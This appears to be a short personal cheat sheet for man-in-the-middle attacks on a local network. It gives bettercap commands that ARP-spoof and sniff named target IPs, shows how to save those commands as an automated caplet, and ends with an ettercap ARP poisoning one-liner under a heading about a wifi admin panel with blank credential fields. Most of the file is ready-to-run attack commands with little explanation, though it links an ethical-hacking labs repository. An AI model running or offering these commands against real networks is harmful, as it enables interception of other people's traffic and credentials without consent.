# wifi_router-MMTK


bace64 decuder:- https://www.google.com/amp/s/amp.base64decode.org/

### bettercap -iface wlan0
  
    
 
 net.probe on
 
 arp.spoof on
 
 set arp.spoof.fullduplex true 
 
 set arp.spoof.targets 10.0.2.5
 
 arp.spoof on
 
 set net.sniff.local true
 
 net.sniff on


# Automate BetterCAP using Caplets
To be more efficient on your work, you can automate the modules setup part by creating a simple Caplet file(file.cap) and adding the commands per line.

## Create the caplet:

touch spoof.cap

## Add the commands and save it :

nano spoof.cap

   
   
   net.probe on
   
   set arp.spoof.fullduplex true 
   
   set arp.spoof.targets 192.168.0.131
   
   arp.spoof on
   
   set net.sniff.local true
   
   net.sniff on


As you can see is the same commands in order that you used previously.

## Start the Bettercap using the spoof Caplet that you created:

    bettercap -iface eth0 -caplet spoof.cap



# hacking lave
https://github.com/Samsar4/Ethical-Hacking-Labs/tree/master



## Ettercap wifi admin penel

 user:-

 password:- 



ettercap -Tq -M arp:remote -i wlan0 ///

